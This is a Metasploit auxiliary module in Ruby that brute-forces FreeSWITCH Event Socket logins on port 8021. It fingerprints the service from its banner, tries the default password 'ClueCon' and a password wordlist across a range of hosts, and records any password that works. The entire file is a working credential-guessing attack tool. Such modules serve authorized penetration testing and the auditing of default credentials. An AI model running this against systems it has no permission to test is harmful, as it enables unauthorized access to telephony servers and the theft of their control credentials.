##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/credential_collection'
require 'metasploit/framework/login_scanner/freeswitch_event_socket'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'FreeSWITCH Event Socket Login',
      'Description'    => %{
        This module tests FreeSWITCH Event Socket logins on a range of
        machines and report successful attempts.
      },
      'Author'         =>
        [
          'krastanoel <krastanoel[at]gmail.com>'
        ],
      'DefaultOptions' => { 'VERBOSE' => false },
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        Opt::RPORT(8021),
        OptString.new('PASSWORD', [false, 'FreeSWITCH event socket default password', 'ClueCon']),
        OptPath.new('PASS_FILE',
          [
            false,
            'The file that contains a list of of probable passwords.',
            File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')
          ])
      ])

    # freeswitch does not have an username, there's only password
    deregister_options(
      'DB_ALL_CREDS', 'DB_ALL_USERS', 'DB_SKIP_EXISTING', 'BLANK_PASSWORDS',
      'USERNAME', 'USER_AS_PASS', 'USERPASS_FILE', 'USER_FILE', 'PASSWORD_SPRAY'
    )
  end

  def run_host(ip)
    @check = check_host(ip)
    case @check.code
    when 'safe'
      fail_with(Failure::NoAccess, @check.reason)
    when 'unknown'
      fail_with(Failure::Unknown, @check.reason)
    end

    cred_collection = Metasploit::Framework::PrivateCredentialCollection.new(
      password: datastore['PASSWORD'],
      pass_file: datastore['PASS_FILE']
    )
    cred_collection = prepend_db_passwords(cred_collection)

    scanner = Metasploit::Framework::LoginScanner::FreeswitchEventSocket.new(
      host: ip,
      port: rport,
      cred_details: cred_collection,
      stop_on_success: datastore['STOP_ON_SUCCESS'],
      connection_timeout: 10
    )

    scanner.scan! do |result|
      credential_data = result.to_h
      credential_data.merge!(
        module_fullname: self.fullname,
        workspace_id: myworkspace_id
      )

      if result.success?
        credential_data.delete(:username) # This service uses no username
        credential_core = create_credential(credential_data)
        credential_data[:core] = credential_core
        create_credential_login(credential_data)

        if datastore['VERBOSE']
          vprint_good("Login Successful: #{result.credential.private} (#{result.status}: #{result.proof.strip})")
        else
          print_good("Login Successful: #{result.credential.private}")
        end
      else
        invalidate_login(credential_data)
        vprint_error("LOGIN FAILED: #{result.credential.private} (#{result.status}: #{result.proof.strip})")
      end
    end
  end

  def check_host(ip)
    connect
    banner = sock.get
    disconnect(sock)

    if banner.include?('Access Denied, go away.') || banner.include?('text/rude-rejection')
      return Exploit::CheckCode::Safe('Access denied by network ACL')
    end

    unless banner.include?('Content-Type: auth/request')
      return Exploit::CheckCode::Unknown('Unable to determine the service fingerprint')
    end

    return Exploit::CheckCode::Appears
  end
end
